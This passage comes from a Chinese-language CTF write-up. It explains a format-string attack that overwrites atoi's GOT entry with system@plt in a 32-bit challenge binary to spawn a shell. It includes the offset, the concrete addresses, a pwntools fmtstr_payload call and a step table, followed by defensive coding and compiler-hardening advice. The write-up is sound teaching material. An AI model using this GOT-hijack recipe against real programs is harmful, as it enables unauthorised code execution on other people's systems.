如果要写的字节比当前计数小，就多打印 `0x100` 个字符，让计数绕一圈，低字节仍然是目标值。

### 4. GOT、PLT 与延迟绑定

```text
call atoi@plt
      │
      ▼
atoi@plt: jmp [atoi@got]  ──►  GOT 里的地址
                                  │
                    第一次：指向解析器
                    之后：指向真实 atoi
```

| 概念 | 位置 | 作用 |
| --- | --- | --- |
| GOT | 数据段 | 存函数真实地址 |
| PLT | 代码段 | 跳板，跳转到 GOT |
| 延迟绑定 | 运行时 | 第一次调用才解析，之后走缓存 |
| Partial RELRO | 保护属性 | GOT 可写 |
| Full RELRO | 保护属性 | GOT 只读 |

### 5. 为什么写 `system@plt` 而不是 `system@got`

- `system@plt` 是程序里现成的跳板，地址固定（No PIE），不需要知道 libc 基址；
- `system@got` 里存的是 libc 中 `system` 的真实地址，受 ASLR 影响，除非先泄漏 libc，否则不知道；
- 把 `atoi@got` 改成 `system@plt`，调用 `atoi` 时会先跳到 `system@plt`，再由它解析/跳转到真正的 `system`。

### 6. 为什么选 `atoi`

`atoi` 在这题里几乎是“为利用量身定做”的：

- 它在 `printf(buf)` 之后才被调用，来得及改 GOT；
- 它的参数是 `nptr`，也就是我们第二次输入的内容；
- 它的返回值只用于和随机数比较，改掉之后原来的比较逻辑就废了；
- `system` 的 PLT 已经存在（源码里有 `system("/bin/sh")`），不用自己找 libc。

如果题目把 `atoi` 换成 `strcmp`、`strlen` 之类，思路仍然一样：**找一个“参数可控、在漏洞点之后被调用”的函数，把它的 GOT 改成 `system`。**

### 7. 为什么 `printf` 和 `atoi` 的调用顺序很重要

`printf` 是漏洞点，`atoi` 是目标。利用顺序是：

```text
printf(buf)  ──► 改写 atoi@got
      │
      ▼
printf("your passwd:")
      │
      ▼
read(0, nptr, 0xF)
      │
      ▼
atoi(nptr)  ──►  system("/bin/sh")
```

如果 `atoi` 在 `printf(buf)` 之前就被调用过，GOT 里已经是解析后的地址，但我们仍然可以覆盖它；关键是**覆盖之后还要有一次调用**。这题正好在漏洞点之后调用 `atoi`。

### 8. `fmtstr_payload` 的 offset 是什么

`fmtstr_payload(offset, writes, write_size='byte')` 的 `offset` 不是“第几个字节”，而是：

> **缓冲区开头对应 printf 的第几个参数。**

本题缓冲区开头是第 10 个参数，所以写 `10`。如果偏移写错，生成的 `%N$hhn` 会写到错误的栈位置，GOT 根本改不到。

### 9. Canary、NX、PIE、RELRO 在这题里的角色

| 保护 | 本题状态 | 是否影响利用 |
| --- | --- | --- |
| Canary | 开启 | 不影响，因为不溢出 |
| NX | 开启 | 不影响，因为不执行栈代码 |
| PIE | 关闭 | **有利**，GOT/PLT 地址固定 |
| Partial RELRO | 开启 | **有利**，GOT 可写 |

这题的保护组合看起来很多，但真正挡住“栈溢出”的保护（Canary、NX）对格式化字符串都没用。**保护要看它保护的是什么，不要看到 Canary 就以为没法打。**

## 新手常见问题

{% note info %}
**Q1：为什么 `printf(buf)` 有漏洞？**

因为 `buf` 被当成了格式串。只要用户输入里带 `%p`、`%s`、`%n`，printf 就会把它们当成格式说明符，去栈上/寄存器里找参数。正确写法是 `printf("%s", buf)`，让用户输入永远是数据。
{% endnote %}

{% note info %}
**Q2：偏移为什么是 10，不是 1？**

因为 `printf` 的可变参数从格式串指针后面的第一个栈槽开始算，而 `buf` 在栈帧里离格式串指针有一段距离。本题实测第 10 个参数正好是 `buf` 的开头。具体数字取决于编译器的栈布局，必须用 `%p` 脚本测。
{% endnote %}

{% note info %}
**Q3：`%p` 和 `%s` 有什么区别？**

`%p` 打印参数本身的值，比如 `0x804c044`；`%s` 把参数当地址，打印这个地址指向的字符串。想泄漏某个地址里的内容，用 `%s`；想泄漏栈上的值，用 `%p`。
{% endnote %}

{% note info %}
**Q4：`%n`、`%hn`、`%hhn` 怎么选？**

看要写多少字节。`%n` 写 4 字节，`%hn` 写 2 字节，`%hhn` 写 1 字节。写 GOT 这种地址时，用 `%hhn` 逐字节写最稳，因为每次最多打印 255 个字符；用 `%n` 要打印上亿个字符，程序会崩。
{% endnote %}

{% note info %}
**Q5：为什么用 `%hhn` 而不是 `%n`？**

`atoi@got` 要写 `0x08049080`，十进制约 1.34 亿。`%n` 要求 printf 先输出这么多字符，实际打不出来。`%hhn` 把它拆成 4 个字节，每次最多 255 个字符，4 次就写完。
{% endnote %}

{% note info %}
**Q6：GOT 和 PLT 是什么关系？**

PLT 是代码段里的跳板，`atoi@plt` 会执行 `jmp [atoi@got]`；GOT 是数据段里的地址表，存着 `atoi` 的真实地址。改 GOT 就是改“跳板要跳去哪”。
{% endnote %}

{% note info %}
**Q7：为什么 Partial RELRO 能改 GOT？**

Partial RELRO 只保护 `.got` 的一部分，`.got.plt` 仍然可写；Full RELRO 会在启动时解析所有符号并把 GOT 设成只读，那时这种改法就失效了。`checksec` 看到 `Partial RELRO` 就可以考虑 GOT 劫持。
{% endnote %}

{% note info %}
**Q8：为什么覆盖 `atoi`，不覆盖 `printf` 或 `system`？**

`printf` 正在执行，改它来不及影响当前调用；`system` 是我们要跳过去的目标，改它没意义。`atoi` 在漏洞点之后被调用，参数又是我们第二次输入的内容，最适合被改成 `system`。
{% endnote %}

{% note info %}
**Q9：为什么发两次？第二次为什么是 `/bin/sh`？**

第一次发格式化字符串 payload，改写 `atoi@got`；第二次发 `/bin/sh`，它会作为 `nptr` 传给已经被改成 `system` 的 `atoi`，于是执行 `system("/bin/sh")`。
{% endnote %}

{% note info %}
**Q10：为什么 shell 出现时还没打印 `ok!!`？**

因为 shell 是在 `if ( atoi(nptr) == ... )` 的条件求值里启动的：`atoi(nptr)` 已经变成 `system(nptr)`，`system` 会等 shell 退出才返回。程序自己的 `puts("ok!!")` 在 `if` 体里，还没轮到。
{% endnote %}

{% note info %}
**Q11：泄漏随机数的解法怎么处理空字节？**

`%s` 遇到 `\x00` 会停。可以先读一段，如果不足 4 字节就在末尾补 `\x00`；如果空字节在中间，补零会猜错。更稳的做法是分别泄漏 `0x804C044` 到 `0x804C047` 四个地址，用分隔符拼接；或者直接用 GOT 劫持绕开随机数。
{% endnote %}

{% note info %}
**Q12：有 Canary 为什么还能打？**

Canary 防的是栈溢出，不是格式化字符串。这题的 `read` 只读 99 字节到 100 字节的 `buf`，不会覆盖 Canary；`printf` 只是按参数序号读栈，不写栈。保护要看它保护的对象。
{% endnote %}

{% note info %}
**Q13：32 位和 64 位的偏移为什么不一样？**

32 位所有参数都在栈上；64 位前 6 个参数在寄存器里，第 7 个才到栈上。所以同样的 `printf(buf)`，32 位可能偏移 10，64 位可能偏移 6、7、8。做题时一定要用脚本测。
{% endnote %}

{% note info %}
**Q14：远程连不上怎么办？**

先确认主机名是 `*.tcp-ctf2.dasctf.com`、端口 `9999`、`remote` 写了 `ssl=True, sni=HOST`。平台地址是临时的，过期失效很正常，换一个新环境再试。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件 | `file pwn8`，确认 32 位、动态链接、stripped |
| 2 | 看保护 | `checksec --file=pwn8`，Canary、NX、Partial RELRO、No PIE |
| 3 | 看 main | IDA `F5`，找到 `printf(buf)`、`atoi(nptr)`、`system("/bin/sh")` |
| 4 | 测偏移 | `AAAA.%p...`，找 `41414141`，本题为 10 |
| 5 | 找地址 | `elf.got['atoi']` = `0x804c034`，`elf.plt['system']` = `0x8049080` |
| 6 | 写 GOT | `fmtstr_payload(10, {atoi_got: system_plt}, write_size='byte')` |
| 7 | 发两次 | 第 1 次 payload，第 2 次 `/bin/sh` |
| 8 | 拿 shell | `p.interactive()`，`cat /flag` |
| 9 | 备选 | `%s` 泄漏 `0x804C044` 随机数，再发十进制值 |

## 顺手聊聊怎么防

格式化字符串漏洞的根因只有一个：**用户输入被当成了格式串。**

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **永远写 `printf("%s", buf)`** | 用户输入只作为参数，不作为格式串 |
| ★★★ | **编译时加 `-Wformat-security`** | 让 `printf(buf)` 这类写法直接报警告 |
| ★★☆ | **开启 Full RELRO** | GOT 只读，GOT 劫持失效 |
| ★★☆ | **开启 PIE** | 代码段地址随机化，增加写地址的难度 |
| ★★☆ | **开启 FORTIFY_SOURCE** | 部分格式化函数会做检查 |
| ★☆☆ | **代码审计 / 静态分析** | 搜索 `printf(`、`fprintf(`、`sprintf(` 的可控参数 |

正确的写法：

```c
printf("%s", buf);   // 正确：buf 是数据
printf(buf);         // 错误：buf 是格式串
```

如果确实需要格式化，也要限制格式串的来源，不要让用户完全控制。

{% note success %}
**一条原则**：格式串是“代码”，用户输入是“数据”。**把数据放进格式串的位置，就等于让用户写代码。**
{% endnote %}

## 小结

这道题把格式化字符串从“读”到“写”完整走了一遍：

- **`printf(buf)` 是漏洞点**：没有给 printf 传参数，它就会去栈上/寄存器里找；
- **偏移要用脚本测**：本题是 10，`AAAA.%p...` 加分隔符是最稳的测法；
- **`%p` 读值、`%s` 读内存、`%n` 写内存**：三个占位符分别对应泄漏、解引用、写入；
- **`%hhn` 适合写 GOT**：一次写 1 字节，避免打印上亿个字符；
- **Partial RELRO 让 GOT 可写**：`atoi@got` → `system@plt`，下次调用 `atoi` 就变成 `system`；
- **两次输入各有分工**：第一次写 GOT，第二次给 `system` 传 `/bin/sh`；
- **shell 在条件判断里出现**：`atoi(nptr)` 被替换成 `system(nptr)`，不等 `if` 体执行就能拿 shell；
- **另一条路是泄漏随机数**：用 `%s` 读 `0x804C044`，但要处理空字节；
- **保护要看对象**：Canary 和 NX 挡不住格式化字符串，Partial RELRO 反而给了 GOT 劫持的机会。

下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 64 位格式化字符串 | 前 6 个参数在寄存器，偏移和栈布局不同 |
| Full RELRO | GOT 只读，改打 `__malloc_hook` / `__free_hook` 或返回地址 |
| 泄漏 libc | 用 `%s` 读 GOT 里的 libc 地址，算基址后 ret2libc |
| 格式化字符串 + 栈溢出 | 先用 `%n` 改返回地址，再触发溢出 |
| 无 `system@plt` | 泄漏 libc，找 `system` 和 `/bin/sh` |
| 格式化字符串写任意地址 | 多字节写、地址对齐、计数绕回 |

{% note success %}
**一条经验**：格式化字符串题先做三件事——**测偏移、找可写目标、确认保护**。偏移决定 `%N$` 里的 N，可写目标决定改哪里（GOT、返回地址、hook），保护决定能不能改（RELRO）。这三件事定了，payload 只是算术。
{% endnote %}
